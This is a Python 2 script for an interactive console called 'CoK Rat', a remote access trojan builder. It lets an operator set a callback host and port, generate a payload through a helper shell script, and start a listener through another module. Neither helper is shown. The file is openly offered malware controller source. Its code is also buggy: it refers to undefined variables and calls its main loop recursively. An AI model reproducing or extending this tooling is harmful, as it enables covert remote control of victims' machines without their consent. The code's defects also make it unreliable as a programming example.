#!/usr/bin/env python
# -*- coding: utf-8 -*-

import os, sys, subprocess
from time import sleep
os.system("clear")
reload(sys)
sys.setdefaultencoding("utf-8")

host = " "
port = " "
output = " "

def logo():
 print("""
\t  ______      __ __    ____        __ 
\t  / ____/___  / //_/   / __ \____ _/ /_
\t / /   / __ \/ ,<     / /_/ / __ `/ __/
\t/ /___/ /_/ / /| |   / _, _/ /_/ / /_  
\t\____/\____/_/ |_|  /_/ |_|\__,_/\__/  
\t [*] Rat Version : Python Based v1.1
\t [*] Coded By ./Mr.Cakil
\t [*] greetz : 99Syndicate - Annonymous Cyber Team
  """)

def help():
 print("""
  Commands :
       set LHOST       : Set Your Host (e.g set lhost 127.0.0.1)
       set LPORT       : Set Your Port (e.g set lport 6969)
       set OUTPUT     : Set Your Output Name And Path (e.g set OUTPUT /home/payload)
       show values    : Show Host, Port And Output Value
       start listener : Start koneksi server kamu

  tolong Report ini bug ke email saya
  EMAIL : mrcakil@programmer.net\n""")
       
def main():
    global host, port, output

    while True:
        cmd = raw_input("[*] Rat@Cakil:~# ").lower()

        if cmd == "help":
            help()

        elif cmd == 'banner':
            os.system("clear")
            logo()
            main()

        elif "clear" in cmd:
            os.system("clear")

        elif "set lhost" in cmd:
            host = cmd.split()[-1]

        elif "set lport" in cmd:
            port = int(cmd.split()[-1])

        elif "set output" in cmd:
            output = cmd.split()[-1]

        elif cmd == "show values":
            print "\n[+] HOST   : %s\n[+] PORT   : %s\n[+] OUTPUT : %s\n"%(host, port,output)

        elif cmd == "generate payload" or cmd == "generate":
            if host != " " and port != " " and output != " ":
                print("[+] Membuat Payload . . .")
                sleep(1)
                print("[*] Using Configuration . . .\n |_ HOST   : "+host+"\n |_ PORT   : "+str(port)+"\n |_ OUTPUT : "+output)
                sleep(3)
                os.system("sh modules/gen.sh "+host+" "+str(port)+" "+output)
                print("[+]  Success Gan . . .")
                sleep(1)
                main()
            else:
                print "\n[!] HOST   : %s\n[!] PORT   : %s\n[!] OUTPUT : %s\n"%(lhost,lport,output)

        elif cmd == "start" or cmd == "run" or cmd == "start listener":
            if host != " " and port != " ":
                if os.name == "nt":
                    subprocess.Popen([sys.executable, 'modules/kontol.py', lhost, str(lport)], creationflags=subprocess.CREATE_NEW_CONSOLE)
                else:
                    os.system(sys.executable + " modules/kontol.py %s %s"%(host, str(port)))
            else:
                print "\n[!] Host : %s\n[!] Port : %s\n"%(host,port)
        else:
            print("[!] Check comand kamu. . .")
            main()

def contol():
    try:
        logo()
        main()
    except KeyboardInterrupt:
        print("\n[!] CTRL+C Detect Exiting Tools . . .")
        sleep(2)
        sys.exit()
if __name__ == "__main__":
    contol()
